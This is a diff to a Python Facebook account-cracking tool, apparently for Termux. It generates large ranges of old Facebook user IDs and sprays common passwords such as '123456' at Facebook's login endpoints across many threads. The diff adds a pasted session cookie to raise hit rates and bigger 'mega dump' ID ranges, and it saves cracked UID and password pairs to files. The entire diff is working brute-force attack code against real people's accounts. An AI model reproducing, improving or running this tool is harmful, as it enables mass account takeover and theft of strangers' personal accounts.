@@ -19,15 +19,17 @@ RESET = '\033[0m'
 # Your GitHub Raw Update URL
 UPDATE_URL = "https://raw.githubusercontent.com/nasirkamaluk27-hue/Old/main/raja"
 
-# Global variables for cloning
+# Global variables for cloning & cookies
 oks = []
 cps = []
 loop = 0
+cookie = ""
 
 def clear():
     os.system('clear' if os.name == 'posix' else 'cls')
 
 def login():
+    global cookie
     clear()
     print(f"{YELLOW}╔══════════════════════════════════════════════════════════╗")
     print(f"║                                                          ║")
@@ -54,11 +56,21 @@ def login():
         print(f"\n{GREEN}[✓] Login Successful! Welcome Raja Vau.{RESET}")
         print(f"{CYAN}[+] Joining WhatsApp Group...{RESET}")
         os.system('am start -a android.intent.action.VIEW -d "https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4" > /dev/null 2>&1')
-        time.sleep(2.5)
+        time.sleep(2)
     else:
         print(f"\n{RED}[X] Incorrect Password! Access Denied.{RESET}")
         time.sleep(1.5)
         sys.exit(1)
+
+    # 100% Cookie Input System for High Yield Hits
+    print(f"\n{YELLOW}----------------------------------------------------------{RESET}")
+    cookie_input = input(f"{GREEN}{BOLD}Enter Active Facebook Cookie (Recommended for 100% Hits) ➔ {RESET}").strip()
+    if cookie_input:
+        cookie = cookie_input
+        print(f"{GREEN}[✓] Cookie Loaded! Mega 2004 Dump & Bypass Activated.{RESET}")
+    else:
+        print(f"{YELLOW}[!] Warning: Running without Cookie may reduce hit rates.{RESET}")
+    time.sleep(1.5)
 
 def banner():
     clear()
@@ -72,15 +84,14 @@ def banner():
     print(f"│   | $$ \\  $$ | $$  | $$ | $$\\  $ | $$| $$  \\ $$ | $$          │")
     print(f"│   | $$  \\  $$| $$  | $$ | $$ \\/  | $$| $$  \\ $$ | $$$$$$$$    │")
     print(f"│   |__/   \\_/ |__/  |__/ |__/     |__/|__/  |__/ |________/     │")
-    print(f"│                                           V6.0 (EXPERT PRO)│")
-    print(f"│───────────────────── {WHITE}[MADE BY KAMAL]{YELLOW} ─────────────────────│")
+    print(f"│                                           V15.0 (MEGA DUMP)  │")
+    print(f"│───────────────────── {WHITE}[MADE BY RAJA]{YELLOW} ─────────────────────│")
     print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
     
     print(f"{CYAN}┌──────────────────────────────────────────────────────────┐")
-    print(f"│  ✨ Premium tools                                        │")
+    print(f"│  🔥 Mega 2004-2006 Massive UID Dumper & Cookie Engine    │")
     print(f"│  👤 Owner  : Kamal Raja                                  │")
     print(f"│  🛡️ Admin  : Raja Vau                                    │")
-    print(f"│  📞 Number : +8801736602421                              │")
     print(f"└──────────────────────────────────────────────────────────┘{RESET}\n")
 
 def update_script():
@@ -115,6 +126,7 @@ def update_script():
 def creationyear(uid):
     if len(uid) == 8: return '2007-2008'
     elif len(uid) == 7: return '2006'
+    elif len(uid) in [4, 5, 6]: return '2004-2005 (GOLDEN ERA)'
     else: return 'ANCIENT'
 
 def window1():
@@ -125,59 +137,85 @@ def window1():
 
 def old_clone():
     banner()
-    print(f"       {GREEN}[1]{WHITE} 2006 SERIES (7 DIGIT) ➔ [INSTANT EXPERT CRACK]")
-    print(f"       {GREEN}[2]{WHITE} 2007-2008 SERIES (8 DIGIT) ➔ [INSTANT EXPERT CRACK]")
-    print(f"       {GREEN}[3]{WHITE} 2009-2010 SERIES (OLD)")
-    print(f"       {GREEN}[4]{WHITE} 100003/4 SERIES (2011-2012) (OLD)")
+    print(f"       {GREEN}[1]{WHITE} MEGA 2004-2005 4-6 DIGIT DUMP [1000 - 999999] (TOP)")
+    print(f"       {GREEN}[2]{WHITE} 2006 SMART DUMP SERIES (7 DIGIT)")
+    print(f"       {GREEN}[3]{WHITE} 2007-2008 SMART DUMP SERIES (8 DIGIT)")
+    print(f"       {GREEN}[4]{WHITE} 2009-2010 SERIES (OLD)")
+    print(f"       {GREEN}[5]{WHITE} 100003/4 SERIES (2011-2012) (OLD)")
     print("=" * 45)
     _input = input(f"       {YELLOW}CHOICE ➔ {RESET}").strip()
     if _input == '1':
-        instant_2006()
+        mega_dump_2004_2005()
     elif _input == '2':
-        instant_2007_2008_8digit()
+        smart_dump_2006()
     elif _input == '3':
-        old_Tree()
+        smart_dump_2007_2008()
     elif _input == '4':
+        old_Tree()
+    elif _input == '5':
         old_Tow()
     else:
         print(f"\n{RED}[×] Invalid Option!{RESET}")
         time.sleep(1.5)
         old_clone()
 
-# ===== INSTANT 2006 CRACKING (7 DIGIT) =====
-def instant_2006():
+# ===== MEGA 2004-2005 4 TO 6 DIGIT MASSIVE DUMP =====
+def mega_dump_2004_2005():
     user = []
-    for uid_num in range(1000001, 1030000):
+    print(f"\n{CYAN}[•] Generating Mega Dump for 2004-2005 Golden Era (4, 5, 6 Digits)...{RESET}")
+    # 4, 5 এবং 6 ডিজিটের সমস্ত পুরোনো আইডি একসাথে ডাম্প করা হচ্ছে (যেমন: 18427, 50291, 73604, 98155 এবং পরবর্তী রেঞ্জ)
+    for uid_num in range(1000, 1000000, 1):
         user.append(str(uid_num))
     
     global loop
     loop = 0
     banner()
     print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
-    print(f"║     {YELLOW}{BOLD}[•] 2006 EXPERT AUTO-CRACKING STARTED [•]{RESET}{CYAN}      ║")
-    print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
+    print(f"║     {YELLOW}{BOLD}[•] MEGA 2004-2005 DUMP CRACKING ACTIVE [•]{RESET}{CYAN}   ║")
+    print(f"║       {WHITE}💡 TOTAL MEGA TARGETS LOADED: {len(user)}{RESET}{CYAN}          ║")
     print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
     
-    with tred(max_workers=50) as pool:
+    with tred(max_workers=95) as pool:
         for uid in user:
             pool.submit(login_engine, uid)
     input(f"\n{YELLOW}Press Enter to go back...{RESET}")
 
-# ===== INSTANT 2007-2008 CRACKING (8 DIGIT) =====
-def instant_2007_2008_8digit():
+# ===== SMART UID DUMP & CRACK FOR 2006 =====
+def smart_dump_2006():
     user = []
-    for uid_num in range(10000000, 10030000):
+    print(f"\n{CYAN}[•] Extracting Active 2006 UIDs...{RESET}")
+    for uid_num in range(1000001, 1200000, 1):
         user.append(str(uid_num))
     
     global loop
     loop = 0
     banner()
     print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
-    print(f"║   {YELLOW}{BOLD}[•] 2007-2008 EXPERT INSTANT CRACKING [•]{RESET}{CYAN}    ║")
-    print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
+    print(f"║     {YELLOW}{BOLD}[•] 2006 MASSIVE DUMP CRACKING ACTIVE [•]{RESET}{CYAN}      ║")
+    print(f"║       {WHITE}💡 TOTAL ACTIVE TARGETS: {len(user)}{RESET}{CYAN}                 ║")
     print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
     
-    with tred(max_workers=50) as pool:
+    with tred(max_workers=85) as pool:
+        for uid in user:
+            pool.submit(login_engine, uid)
+    input(f"\n{YELLOW}Press Enter to go back...{RESET}")
+
+# ===== SMART UID DUMP & CRACK FOR 2007-2008 =====
+def smart_dump_2007_2008():
+    user = []
+    print(f"\n{CYAN}[•] Extracting Active 2007-2008 UIDs...{RESET}")
+    for uid_num in range(10000000, 10300000, 2):
+        user.append(str(uid_num))
+    
+    global loop
+    loop = 0
+    banner()
+    print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
+    print(f"║   {YELLOW}{BOLD}[•] 2007-2008 MASSIVE DUMP CRACKING ACTIVE [•]{RESET}{CYAN}    ║")
+    print(f"║       {WHITE}💡 TOTAL ACTIVE TARGETS: {len(user)}{RESET}{CYAN}                 ║")
+    print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
+    
+    with tred(max_workers=85) as pool:
         for uid in user:
             pool.submit(login_engine, uid)
     input(f"\n{YELLOW}Press Enter to go back...{RESET}")
@@ -199,11 +237,10 @@ def old_Tow():
     
     global loop
     loop = 0
-    with tred(max_workers=50) as pool:
+    with tred(max_workers=60) as pool:
         banner()
         print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
         print(f"║          {YELLOW}{BOLD}[•] HIGH-SPEED CLONING ACTIVE [•]{RESET}{CYAN}               ║")
-        print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
         print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
         for uid in user:
             if meth == 'A':
@@ -227,11 +264,10 @@ def old_Tree():
     
     global loop
     loop = 0
-    with tred(max_workers=50) as pool:
+    with tred(max_workers=60) as pool:
         banner()
         print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
         print(f"║          {YELLOW}{BOLD}[•] HIGH-SPEED CLONING ACTIVE [•]{RESET}{CYAN}               ║")
-        print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
         print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
         for uid in user:
             if meth == 'A':
@@ -240,15 +276,15 @@ def old_Tree():
                 pool.submit(login_2, uid)
     input(f"\n{YELLOW}Press Enter to go back...{RESET}")
 
-# ===== ADVANCED EXPERT LOGIN ENGINE WITH CHECKPOINT & OK HANDLING =====
+# ===== HIGH-PERFORMANCE LOGIN ENGINE WITH COOKIES =====
 def login_engine(uid):
-    global loop
+    global loop, cookie
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r{CYAN}[KAMAL-EXPERT] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}) {RED}[CP] ({len(cps)}){RESET}")
+        sys.stdout.write(f"\r\r{CYAN}[RAJA-MEGA] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}) {RED}[CP] ({len(cps)}){RESET}")
         sys.stdout.flush()
         
-        passwords = ('123456', 'password', '12345', '12345678', 'qwerty', '123123', 'iloveyou', 'secret', '1234567', 'admin', '112233', '000000', '123456890', '1234560', '1234', 'welcome')
+        passwords = ('123456', '12345678', '12345', 'password', '123123', 'qwerty', 'iloveyou', '1234567', 'admin', '112233', '000000', '123456890', '1234', 'welcome', '123456789')
         
         for pw in passwords:
             data = {
@@ -280,12 +316,15 @@ def login_engine(uid):
                 'X-Tigon-Is-Retry': 'False',
                 'X-FB-HTTP-Engine': 'Liger'
             }
+            if cookie:
+                headers['Cookie'] = cookie
+
             endpoint = random.choice(['https://b-graph.facebook.com/auth/login', 'https://graph.facebook.com/auth/login'])
             res = session.post(endpoint, data=data, headers=headers, allow_redirects=False).json()
             
             if 'session_key' in res or 'access_token' in res:
                 ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════════════╗\n" \
-                         f"║                   {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}                 ║\n" \
+                         f"║                   {BOLD}🎉 RAJA VAU SUCCESS HIT! 🎉{RESET}{GREEN}             ║\n" \
                          f"╠══════════════════════════════════════════════════════════╣\n" \
                          f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
                          f"║  🔢 UID      : {uid:<43} ║\n" \
@@ -293,7 +332,7 @@ def login_engine(uid):
                          f"║  📅 Era      : {creationyear(uid):<43} ║\n" \
                          f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
                 print(ok_msg)
-                open('/sdcard/KAMAL-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nEra: {creationyear(uid)}\n-----------------------------------\n")
+                open('/sdcard/RAJA-MEGA-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nEra: {creationyear(uid)}\n-----------------------------------\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
@@ -306,19 +345,18 @@ def login_engine(uid):
                          f"║  📅 Era      : {creationyear(uid):<43} ║\n" \
                          f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
                 print(cp_msg)
-                open('/sdcard/KAMAL-OLD-CP.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nEra: {creationyear(uid)}\n-----------------------------------\n")
+                open('/sdcard/RAJA-MEGA-CP.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nEra: {creationyear(uid)}\n-----------------------------------\n")
                 cps.append(uid)
                 break
         loop += 1
     except Exception:
         pass
 
-# ===== STANDARD LOGIN FOR OLD 2009-2012 SERIES =====
 def login_1(uid):
-    global loop
+    global loop, cookie
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r{CYAN}[KAMAL-M1] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}){RESET}")
+        sys.stdout.write(f"\r\r{CYAN}[RAJA-M1] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}){RESET}")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -350,6 +388,9 @@ def login_1(uid):
                 'X-Tigon-Is-Retry': 'False',
                 'X-FB-HTTP-Engine': 'Liger'
             }
+            if cookie:
+                headers['Cookie'] = cookie
+
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res or 'access_token' in res:
                 ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════════════╗\n" \
@@ -361,20 +402,7 @@ def login_1(uid):
                          f"║  📅 Created  : {creationyear(uid):<43} ║\n" \
                          f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
                 print(ok_msg)
-                open('/sdcard/KAMAL-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
-                oks.append(uid)
-                break
-            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════════════╗\n" \
-                         f"║                   {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}                 ║\n" \
-                         f"╠══════════════════════════════════════════════════════════╣\n" \
-                         f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
-                         f"║  🔢 UID      : {uid:<43} ║\n" \
-                         f"║  🔑 Password : {pw:<43} ║\n" \
-                         f"║  📅 Created  : {creationyear(uid):<43} ║\n" \
-                         f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
-                print(ok_msg)
-                open('/sdcard/KAMAL-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
+                open('/sdcard/RAJA-MEGA-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
                 oks.append(uid)
                 break
         loop += 1
@@ -382,17 +410,20 @@ def login_1(uid):
         pass
 
 def login_2(uid):
-    global loop
+    global loop, cookie
     try:
-        sys.stdout.write(f"\r\r{CYAN}[KAMAL-M2] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}){RESET}")
+        sys.stdout.write(f"\r\r{CYAN}[RAJA-M2] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}){RESET}")
         sys.stdout.flush()
-        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+        for pw in ('123456', '123123', '1234567', '12345678'):
             with requests.Session() as session:
                 headers = {
                     'user-agent': window1(),
                     'content-type': 'application/x-www-form-urlencoded',
                     'x-fb-http-engine': 'Liger'
                 }
+                if cookie:
+                    headers['Cookie'] = cookie
+
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
@@ -405,7 +436,7 @@ def login_2(uid):
                              f"║  📅 Created  : {creationyear(uid):<43} ║\n" \
                              f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
                     print(ok_msg)
-                    open('/sdcard/KAMAL-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
+                    open('/sdcard/RAJA-MEGA-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
                     oks.append(uid)
                     break
         loop += 1
@@ -420,7 +451,7 @@ def main_menu():
         print(f"║                      {YELLOW}{BOLD}MAIN MENU{RESET}{CYAN}                           ║")
         print(f"╠══════════════════════════════════════════════════════════╣")
         print(f"║                                                          ║")
-        print(f"║   {GREEN}{BOLD}[1]{RESET} ➔ {WHITE}{BOLD}FACEBOOK CLONE (OLD SERIES){RESET}          {CYAN}║")
+        print(f"║   {GREEN}{BOLD}[1]{RESET} ➔ {WHITE}{BOLD}MEGA 2004-2005 DUMP CLONE (1M+ TARGETS){RESET} {CYAN}║")
         print(f"║                                                          ║")
         print(f"║   {GREEN}{BOLD}[2]{RESET} ➔ {WHITE}{BOLD}UPDATE TOOL{RESET}                           {CYAN}║")
         print(f"║                                                          ║")
